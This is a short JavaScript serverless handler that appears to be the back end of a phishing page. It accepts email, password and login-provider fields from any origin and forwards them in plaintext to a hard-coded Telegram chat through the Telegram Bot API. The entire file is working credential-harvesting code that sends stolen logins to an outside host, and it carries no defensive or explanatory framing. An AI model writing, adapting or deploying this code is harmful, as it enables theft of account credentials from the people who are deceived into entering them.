import fetch from 'node-fetch';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  let data = req.body || {};
  if (typeof data === 'string') {
    data = JSON.parse(data);
  }
  const { email, password, provider } = data;
  if (!email || !password || !provider) {
    res.status(400).json({ error: 'Missing fields' });
    return;
  }

  // Telegram Bot API
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = '7002822934'; // Telegram chat ID for @alic2d
  const message = `New login:\nProvider: ${provider}\nEmail: ${email}\nPassword: ${password}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });
    res.status(200).json({ message: 'Login received and sent to Telegram!' });
  } catch (err) {
    res.status(500).json({ error: 'Failed to send to Telegram.' });
  }
}
